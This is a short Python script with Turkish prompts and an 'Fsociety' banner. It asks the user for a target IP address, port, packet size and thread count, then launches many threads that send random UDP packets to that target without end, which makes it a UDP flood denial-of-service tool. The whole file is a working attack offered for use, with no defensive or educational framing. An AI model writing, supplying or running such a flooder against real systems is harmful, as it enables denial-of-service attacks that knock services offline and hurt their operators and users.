import socket
import random
import threading
import pyfiglet

# Figlet ile başlık
ascii_art = pyfiglet.figlet_format("Fsociety")
print(ascii_art)

target_ip = input("Hedef IP: ")
target_port = int(input("Hedef Port: "))
packet_size = int(input("Paket boyutu (byte): "))
thread_count = int(input("Thread sayısı: "))

def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(packet_size)
    while True:
        sock.sendto(bytes, (target_ip, target_port))

print(f"Başlatılıyor: {target_ip}:{target_port} - Thread sayısı: {thread_count}")

for i in range(thread_count):
    thread = threading.Thread(target=udp_flood)
    thread.daemon = True
    thread.start()

# Programı kapatmayalım, kullanıcı CTRL+C ile durduracak
try:
    while True:
        pass
except KeyboardInterrupt:
    print("\nDurduruldu!")
